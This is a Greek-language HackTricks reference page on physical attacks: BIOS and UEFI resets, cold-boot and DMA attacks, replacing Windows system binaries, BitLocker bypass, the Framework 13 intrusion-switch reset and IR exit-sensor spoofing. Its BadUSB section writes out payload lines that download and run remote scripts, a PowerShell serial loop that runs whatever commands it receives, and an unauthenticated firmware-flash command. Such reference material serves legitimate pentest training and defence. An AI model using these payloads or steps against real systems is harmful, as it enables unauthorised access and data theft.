# Φυσικές Επιθέσεις

{{#include ../banners/hacktricks-training.md}}

## Ανάκτηση Κωδικού BIOS και Ασφάλεια Συστήματος

**Resetting the BIOS** μπορεί να επιτευχθεί με διάφορους τρόπους. Οι περισσότερες μητρικές περιλαμβάνουν μια **μπαταρία** που, αν αφαιρεθεί για περίπου **30 λεπτά**, θα επαναφέρει τις ρυθμίσεις του BIOS, συμπεριλαμβανομένου του κωδικού. Εναλλακτικά, ένας **jumper στη μητρική** μπορεί να προσαρμοστεί για να επαναφέρει αυτές τις ρυθμίσεις συνδέοντας συγκεκριμένες ακίδες.

Σε περιπτώσεις όπου οι ρυθμίσεις υλικού δεν είναι δυνατές ή πρακτικές, τα **λογισμικά εργαλεία** προσφέρουν λύση. Η εκκίνηση ενός συστήματος από ένα **Live CD/USB** με διανομές όπως το **Kali Linux** παρέχει πρόσβαση σε εργαλεία όπως τα **_killCmos_** και **_CmosPWD_**, τα οποία μπορούν να βοηθήσουν στην ανάκτηση του κωδικού BIOS.

Σε περιπτώσεις όπου ο κωδικός BIOS είναι άγνωστος, η εσφαλμένη εισαγωγή του **τρεις φορές** συνήθως οδηγεί σε έναν κωδικό σφάλματος. Αυτός ο κωδικός μπορεί να χρησιμοποιηθεί σε ιστότοπους όπως [https://bios-pw.org](https://bios-pw.org) για να ανακτηθεί ενδεχομένως ένας χρήσιμος κωδικός.

### UEFI Ασφάλεια

Για σύγχρονα συστήματα που χρησιμοποιούν **UEFI** αντί του παραδοσιακού BIOS, το εργαλείο **chipsec** μπορεί να χρησιμοποιηθεί για την ανάλυση και τροποποίηση των ρυθμίσεων UEFI, συμπεριλαμβανομένης της απενεργοποίησης του **Secure Boot**. Αυτό μπορεί να επιτευχθεί με την ακόλουθη εντολή:
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## Ανάλυση RAM και Cold Boot Attacks

Η RAM διατηρεί δεδομένα για λίγη ώρα αφού κοπεί η τροφοδοσία, συνήθως για **1 έως 2 λεπτά**. Αυτή η επιμονή μπορεί να επεκταθεί έως **10 λεπτά** με την εφαρμογή ψυχρών ουσιών, όπως υγρό άζωτο. Κατά τη διάρκεια αυτής της επεκταμένης περιόδου, μπορεί να δημιουργηθεί ένα **memory dump** χρησιμοποιώντας εργαλεία όπως **dd.exe** και **volatility** για ανάλυση.

---

## Direct Memory Access (DMA) Attacks

Το **INCEPTION** είναι ένα εργαλείο σχεδιασμένο για **physical memory manipulation** μέσω DMA, συμβατό με διεπαφές όπως **FireWire** και **Thunderbolt**. Επιτρέπει την παράκαμψη διαδικασιών login με την επιδιόρθωση της μνήμης ώστε να γίνεται αποδεκτός οποιοσδήποτε κωδικός. Ωστόσο, είναι αναποτελεσματικό απέναντι σε συστήματα **Windows 10**.

---

## Live CD/USB για Πρόσβαση στο Σύστημα

Η αλλαγή συστημικών binaries όπως **_sethc.exe_** ή **_Utilman.exe_** με ένα αντίγραφο του **_cmd.exe_** μπορεί να παρέχει ένα command prompt με προνόμια συστήματος. Εργαλεία όπως το **chntpw** μπορούν να χρησιμοποιηθούν για την επεξεργασία του αρχείου **SAM** μιας εγκατάστασης Windows, επιτρέποντας αλλαγές κωδικών.

Το **Kon-Boot** είναι ένα εργαλείο που διευκολύνει το login σε συστήματα Windows χωρίς να γνωρίζετε τον κωδικό, τροποποιώντας προσωρινά τον Windows kernel ή το UEFI. Περισσότερες πληροφορίες στο [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/).

---

## Διαχείριση χαρακτηριστικών ασφαλείας των Windows

### Συντομεύσεις εκκίνησης και ανάκτησης

- **Supr**: Πρόσβαση στις ρυθμίσεις BIOS.
- **F8**: Είσοδος σε Recovery mode.
- Πίεση του **Shift** μετά το banner των Windows μπορεί να παρακάμψει το autologon.

### BAD USB Devices

Συσκευές όπως **Rubber Ducky** και **Teensyduino** λειτουργούν ως πλατφόρμες για τη δημιουργία **bad USB** συσκευών, ικανών να εκτελέσουν προκαθορισμένα payloads όταν συνδεθούν σε έναν στόχο.

### Volume Shadow Copy

Τα προνόμια διαχειριστή επιτρέπουν τη δημιουργία αντιγράφων ευαίσθητων αρχείων, συμπεριλαμβανομένου του **SAM**, μέσω PowerShell.

## BadUSB / HID Implant Techniques

### Wi-Fi managed cable implants

- Εμφυτεύματα βασισμένα σε **ESP32-S3** όπως το **Evil Crow Cable Wind** κρύβονται μέσα σε καλώδια USB-A→USB-C ή USB-C↔USB-C, εμφανίζονται καθαρά ως USB keyboard και εκθέτουν το C2 stack τους μέσω Wi‑Fi. Ο χειριστής χρειάζεται μόνο να τροφοδοτήσει το καλώδιο από το θύμα, να δημιουργήσει ένα hotspot με όνομα `Evil Crow Cable Wind` και κωδικό `123456789`, και να πλοηγηθεί στο [http://cable-wind.local/](http://cable-wind.local/) (ή στη DHCP διεύθυνσή του) για να φτάσει στο ενσωματωμένο HTTP interface.
- Το browser UI παρέχει καρτέλες για *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, και *Config*. Τα αποθηκευμένα payloads επισημαίνονται ανά OS, τα keyboard layouts αλλάζουν on the fly, και οι συμβολοσειρές VID/PID μπορούν να τροποποιηθούν για να μιμηθούν γνωστές περιφερειακές.
- Επειδή το C2 βρίσκεται μέσα στο καλώδιο, ένα τηλέφωνο μπορεί να ανεβάσει payloads, να ενεργοποιήσει εκτέλεση και να διαχειριστεί τα credentials του Wi‑Fi χωρίς να αγγίξει το host OS — ιδανικό για φυσικές εισβολές μικρής dwell-time.

### OS-aware AutoExec payloads

- Οι κανόνες AutoExec δένουν ένα ή περισσότερα payloads ώστε να εκτελούνται αμέσως μετά την enumeration του USB. Το εμφύτευμα εκτελεί ελαφριά fingerprinting του OS και επιλέγει το αντίστοιχο script.
- Παράδειγμα ροής εργασίας:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) or `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- Δεδομένου ότι η εκτέλεση είναι unattended, η απλή αντικατάσταση ενός charging cable μπορεί να επιτύχει “plug-and-pwn” αρχική πρόσβαση στο context του logged-on χρήστη.

### HID-bootstrapped remote shell over Wi‑Fi TCP

1. **Keystroke bootstrap:** Ένα αποθηκευμένο payload ανοίγει μια κονσόλα και επικολλάει ένα loop που εκτελεί ό,τι φτάνει στη νέα USB serial συσκευή. A minimal Windows variant is:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** Το implant διατηρεί ανοιχτό το USB CDC channel ενώ το ESP32-S3 του εκκινεί έναν TCP client (Python script, Android APK, or desktop executable) πίσω προς τον operator. Οποιαδήποτε bytes πληκτρολογηθούν στη TCP session προωθούνται στον παραπάνω serial loop, παρέχοντας remote command execution ακόμη και σε air-gapped hosts. Το output είναι περιορισμένο, οπότε οι operators τυπικά εκτελούν blind commands (account creation, staging additional tooling, etc.).

### HTTP OTA επιφάνεια ενημέρωσης

- Το ίδιο web stack συνήθως εκθέτει unauthenticated firmware updates. Evil Crow Cable Wind ακούει στο `/update` και flashes οποιοδήποτε binary ανεβεί:
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- Οι χειριστές πεδίου μπορούν να κάνουν hot-swap λειτουργίες (π.χ., flash USB Army Knife firmware) κατά τη διάρκεια του engagement χωρίς να ανοίξουν το καλώδιο, επιτρέποντας στο implant να μεταβεί σε νέες δυνατότητες ενώ παραμένει συνδεδεμένο στον target host.

## Παράκαμψη BitLocker κρυπτογράφησης

Η BitLocker κρυπτογράφηση μπορεί ενδεχομένως να παρακαμφθεί εάν ο **recovery password** βρεθεί μέσα σε αρχείο dump μνήμης (**MEMORY.DMP**). Εργαλεία όπως **Elcomsoft Forensic Disk Decryptor** ή **Passware Kit Forensic** μπορούν να χρησιμοποιηθούν για αυτόν τον σκοπό.

---

## Social Engineering for Recovery Key Addition

Ένας νέος BitLocker recovery key μπορεί να προστεθεί μέσω social engineering τακτικών, πείθοντας έναν χρήστη να εκτελέσει μια εντολή που προσθέτει ένα νέο recovery key αποτελούμενο από μηδενικά, απλουστεύοντας έτσι τη διαδικασία αποκρυπτογράφησης.

---

## Εκμετάλλευση Chassis Intrusion / Maintenance Switches για Factory-Reset του BIOS

Πολλά σύγχρονα laptops και small-form-factor desktops περιλαμβάνουν έναν **chassis-intrusion switch** που παρακολουθείται από τον Embedded Controller (EC) και το BIOS/UEFI firmware. Ενώ ο κύριος σκοπός του switch είναι να ενεργοποιεί μια ειδοποίηση όταν η συσκευή ανοίγει, οι κατασκευαστές μερικές φορές υλοποιούν ένα **undocumented recovery shortcut** που ενεργοποιείται όταν το switch εναλλαγεί σε συγκεκριμένο μοτίβο.

### Πώς Λειτουργεί η Επίθεση

1. Το switch είναι συνδεδεμένο σε ένα **GPIO interrupt** στον EC.
2. Το firmware που τρέχει στον EC παρακολουθεί το **χρονισμό και τον αριθμό των πατημάτων**.
3. Όταν αναγνωριστεί ένα hard-coded μοτίβο, ο EC καλεί μια *mainboard-reset* ρουτίνα που **σβήνει τα περιεχόμενα του συστήματος NVRAM/CMOS**.
4. Στην επόμενη εκκίνηση, το BIOS φορτώνει τις προεπιλεγμένες τιμές – **ο supervisor password, τα Secure Boot keys και όλες οι προσαρμοσμένες ρυθμίσεις διαγράφονται**.

> Once Secure Boot is disabled and the firmware password is gone, the attacker can simply boot any external OS image and obtain unrestricted access to the internal drives.

### Πραγματικό Παράδειγμα – Framework 13 Laptop

Το recovery shortcut για το Framework 13 (11th/12th/13th-gen) είναι:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
Μετά τον δέκατο κύκλο το EC θέτει μια σημαία που υποδεικνύει στο BIOS να σβήσει το NVRAM στην επόμενη επανεκκίνηση. Η όλη διαδικασία διαρκεί ~40 s και απαιτεί **μόνο ένα κατσαβίδι**.

### Generic Exploitation Procedure

1. Ανοίξτε ή πραγματοποιήστε suspend-resume στη συσκευή-στόχο ώστε το EC να είναι σε λειτουργία.
2. Αφαιρέστε το κάτω κάλυμμα για να αποκαλύψετε τον intrusion/maintenance διακόπτη.
3. Αναπαράγετε το vendor-specific toggle pattern (συμβουλευτείτε documentation, forums, ή reverse-engineer το EC firmware).
4. Συναρμολογήστε ξανά και κάντε reboot – οι προστασίες του firmware θα πρέπει να είναι απενεργοποιημένες.
5. Κάντε boot από live USB (π.χ. Kali Linux) και εκτελέστε τις συνηθισμένες post-exploitation ενέργειες (credential dumping, data exfiltration, εμφύτευση κακόβουλων EFI binaries, κ.λπ.).

### Detection & Mitigation

* Καταγράψτε τα συμβάντα chassis-intrusion στην κονσόλα διαχείρισης του OS και συσχετίστε τα με απροσδόκητες επαναρυθμίσεις του BIOS.
* Χρησιμοποιήστε **tamper-evident seals** σε βίδες/καλύμματα για να ανιχνεύετε το άνοιγμα.
* Φυλάξτε τις συσκευές σε **physically controlled areas**· θεωρήστε ότι η φυσική πρόσβαση ισοδυναμεί με πλήρη παραβίαση.
* Όπου είναι διαθέσιμο, απενεργοποιήστε τη vendor “maintenance switch reset” λειτουργία ή απαιτήστε επιπλέον κρυπτογραφική εξουσιοδότηση για NVRAM resets.

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Οι commodity “wave-to-exit” sensors συνδυάζουν έναν near-IR LED εκπεμπτή με ένα TV-remote style receiver module που αναφέρει λογικό υψηλό μόνο αφού έχει δει πολλαπλούς παλμούς (~4–10) του σωστού carrier (≈30 kHz).
- Ένα πλαστικό κάλυμμα εμποδίζει τον εκπεμπτή και το δέκτη να κοιτάζουν άμεσα ο ένας τον άλλον, οπότε ο controller υποθέτει ότι οποιοσδήποτε επικυρωμένος carrier προέρχεται από κοντινή ανάκλαση και ενεργοποιεί ένα relay που ανοίγει τον μηχανισμό της πόρτας.
- Μόλις ο controller πιστέψει ότι υπάρχει στόχος, συχνά αλλάζει το outbound modulation envelope, αλλά ο δέκτης συνεχίζει να δέχεται οποιοδήποτε burst που ταιριάζει με τον φιλτραρισμένο carrier.

### Attack Workflow
1. **Capture the emission profile** – στερεώστε ένα logic analyser στις ακίδες του controller για να καταγράψετε τόσο τα pre-detection όσο και τα post-detection waveforms που οδηγούν το internal IR LED.
2. **Replay only the “post-detection” waveform** – αφαιρέστε/αγνοήστε τον stock εκπεμπτή και οδηγήστε ένα εξωτερικό IR LED με το ήδη trigger-αρισμένο pattern από την αρχή. Επειδή ο δέκτης ενδιαφέρεται μόνο για τον αριθμό/συχνότητα παλμών, αντιμετωπίζει τον spoofed carrier ως πραγματική ανάκλαση και ενεργοποιεί τη γραμμή relay.
3. **Gate the transmission** – μεταδίδετε τον carrier σε ρυθμισμένα bursts (π.χ., δεκάδες milliseconds on, αντίστοιχα off) για να παρέχετε τον ελάχιστο αριθμό παλμών χωρίς να κορεστεί το AGC του δέκτη ή η λογική χειρισμού παρεμβολών. Η συνεχής εκπομπή γρήγορα απευαισθητοποιεί τον αισθητήρα και σταματά το relay από το να ενεργοποιηθεί.

### Long-Range Reflective Injection
- Η αντικατάσταση του bench LED με μια high-power IR diode, MOSFET driver και εστιαστικά οπτικά επιτρέπει αξιόπιστο trigger από ~6 m απόσταση.
- Ο επιτιθέμενος δεν χρειάζεται line-of-sight προς το aperture του δέκτη· στοχεύοντας την δέσμη σε εσωτερικούς τοίχους, ραφιά ή πλαίσια πορτών που είναι ορατά μέσω υάλου, επιτρέπει στην ανακλώμενη ενέργεια να εισέλθει στο ~30° πεδίο όρασης και μιμείται ένα κοντινό wave-to-exit χέρι.
- Επειδή οι δέκτες αναμένουν μόνο ασθενείς ανακλάσεις, μια πολύ ισχυρότερη εξωτερική δέσμη μπορεί να αναπηδήσει από πολλαπλές επιφάνειες και να παραμείνει πάνω από το όριο ανίχνευσης.

### Weaponised Attack Torch
- Η ενσωμάτωση του driver μέσα σε έναν εμπορικό φακό κρύβει το εργαλείο σε κοινή θέα. Αντικαταστήστε το ορατό LED με ένα high-power IR LED ταιριασμένο στη μπάντα του δέκτη, προσθέστε ένα ATtiny412 (ή παρόμοιο) για να δημιουργεί τα ≈30 kHz bursts, και χρησιμοποιήστε ένα MOSFET για να απορροφά το ρεύμα του LED.
- Ένας τηλεσκοπικός φακός zoom σφίγγει τη δέσμη για εμβέλεια/ακρίβεια, ενώ ένας κινητήρας δόνησης υπό έλεγχο MCU δίνει haptic επιβεβαίωση ότι η διαμόρφωση είναι ενεργή χωρίς να εκπέμπεται ορατό φως.
- Η κύλιση μέσω αρκετών αποθηκευμένων modulation patterns (λεπτά διαφορετικές carrier frequencies και envelopes) αυξάνει τη συμβατότητα μεταξύ επωνυμιών αισθητήρων, επιτρέποντας στον χειριστή να σαρώσει ανακλώσες επιφάνειες μέχρι το relay να κάνει ακουστό κλικ και η πόρτα να απελευθερωθεί.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
